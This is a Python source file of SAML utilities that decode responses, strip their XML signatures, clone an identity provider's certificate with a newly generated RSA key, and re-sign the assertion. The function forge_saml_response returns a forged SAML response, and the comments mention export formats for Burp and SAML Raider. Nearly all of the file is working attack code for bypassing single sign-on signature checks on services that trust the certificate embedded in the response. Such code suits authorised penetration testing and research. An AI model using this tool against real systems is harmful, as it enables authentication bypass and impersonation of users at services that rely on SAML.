import base64
from urllib.parse import unquote, quote
from lxml import etree
from lxml.etree import tostring
from signxml import XMLSigner, XMLVerifier
import signxml
from OpenSSL import crypto
from cryptography.hazmat.primitives import serialization 
import sys


placeholder = '<Signature Id="placeholder"></Signature>'

def web64_encode(val):
    return base64.urlsafe_b64encode(val).replace(b'=', b'')


def web64_decode(val):
    return base64.urlsafe_b64decode(val + '=' *(4-(len(val)%4)))


def decode_saml(raw_saml):
    return base64.b64decode(unquote(raw_saml))

def encode_saml(xml_text):
    return quote(base64.b64encode(xml_text))


def get_saml_cert(saml):
    return etree.ElementTree(etree.fromstring(saml)).xpath("//*[local-name()='X509Certificate']")[0].text

def get_saml_cert_raw(raw_saml):
    return get_saml_cert(decode_saml(raw_saml))


def get_signed_ref(saml):
    return etree.ElementTree(etree.fromstring(saml)).xpath("//*[local-name()='Reference']")[0].get('URI').lstrip('#')



def get_signed_ref_raw(raw_saml):
    return get_signed_ref(decode_saml(raw_saml))



def string_to_xml(xml_string):
    return etree.ElementTree(etree.fromstring(xml_string))


def verify_saml(saml):
    '''Returns signed xml, exception if signature invalid'''
    cert = get_saml_cert(saml)
    return XMLVerifier().verify(saml, x509_cert=cert).signed_data


def verify_saml_raw(raw_saml):
    '''Returns signed xml, exception if signature invalid'''
    cert = get_saml_cert_raw(raw_saml)
    return XMLVerifier().verify(base64.b64decode(unquote(raw_saml)), x509_cert=cert).signed_data


def sign_saml(xml_root, key, cert, reference, mode='normal', c14n='http://www.w3.org/2001/10/xml-exc-c14n#'):
    if mode == 'microsoft':
        return tostring(XMLSigner(method=signxml.methods.enveloped, c14n_algorithm=c14n, namespaces={None:'http://www.w3.org/2000/09/xmldsig#'}).sign(xml_root, key=key, cert=cert, reference_uri=reference) )
    else:
        return tostring(XMLSigner(method=signxml.methods.enveloped, c14n_algorithm=c14n).sign(xml_root, key=key, cert=cert, reference_uri=reference) )


def strip_signature(raw_saml, placeholder=placeholder):
    x = string_to_xml(decode_saml(raw_saml))
    n = x.xpath(".//*[local-name()='Signature']")[0]
    p = n.getparent()
    p.replace(n, etree.fromstring(placeholder))
    return tostring(x)




def copy_cert(saml_cert):
    x509 = crypto.load_certificate(crypto.FILETYPE_ASN1, base64.b64decode(saml_cert))

    # Creating key
    k = crypto.PKey()
    k.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))
    cert = crypto.X509()

    # Setting cert details from the original certificate
    cert.set_version(x509.get_version())
    cert.set_serial_number(x509.get_serial_number())
    cert.set_subject(x509.get_subject())
    cert.set_issuer(x509.get_issuer())
    cert.set_notBefore(x509.get_notBefore())
    cert.set_notAfter(x509.get_notAfter())
    cert.set_pubkey(k)
    key1 = k.to_cryptography_key()

    # add extensions
    cert.add_extensions([x509.get_extension(a) for a in range(0, x509.get_extension_count())])

    sig = x509.get_signature_algorithm().decode('ascii')
    if 'WithRSAEncryption' not in sig:
        raise Exception('Error: RSA not used to sign cert --- what??. Signature algorithm: %s' %(sig))
    cert.sign(k, sig.replace('WithRSAEncryption', ''))

    # Private key in traditional RSA PEM format - for SAML Raider import
    trsa = key1.private_bytes(encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm=serialization.NoEncryption())

    # PFX file format
    pfx = crypto.PKCS12()
    pfx.set_privatekey(k)
    pfx.set_certificate(cert)
    pfxdata = pfx.export()
    pfxdata_pwd = pfx.export(passphrase=b'password') # for burp

    return {
        'cert' : crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode('utf-8'),
        'key' : crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode('utf-8'),
        'pub' : crypto.dump_publickey(crypto.FILETYPE_PEM, k).decode('utf-8'),
        'asn1_der_cert' : crypto.dump_certificate(crypto.FILETYPE_ASN1, cert),
        'asn1_der_key' : crypto.dump_privatekey(crypto.FILETYPE_ASN1, k),
        'asn1_der_pub' : crypto.dump_publickey(crypto.FILETYPE_ASN1, k),
        'trad_rsa' : trsa,
        'pfx' : pfxdata,
        'pfx_password' : pfxdata_pwd,
        'socat' : crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode('utf-8')+crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode('utf-8'),
        'crypto' : crypto
    }



# key is private key in PEM format with file headers
# cert is in PEM format with file headers
def forge_saml_response(raw_saml, key=None, cert=None):
    try:
        verify_saml_raw(raw_saml)
    except:
        print('Input SAML is not properly signed, but maybe you edited it?')
    real_cert = get_saml_cert_raw(raw_saml)
    if not key or not cert:
        fake_cert = copy_cert(real_cert)
        key = fake_cert['key']
        cert = fake_cert['cert']
    ref = get_signed_ref_raw(raw_saml)
    base = strip_signature(raw_saml)
    base_xml = string_to_xml(base)
    mode = 'normal'
    if '<ds:' not in str(base):
        mode = 'microsoft'
    signed = sign_saml(base_xml, key, cert, ref, mode=mode)
    verify_saml(signed)
    return encode_saml(signed)

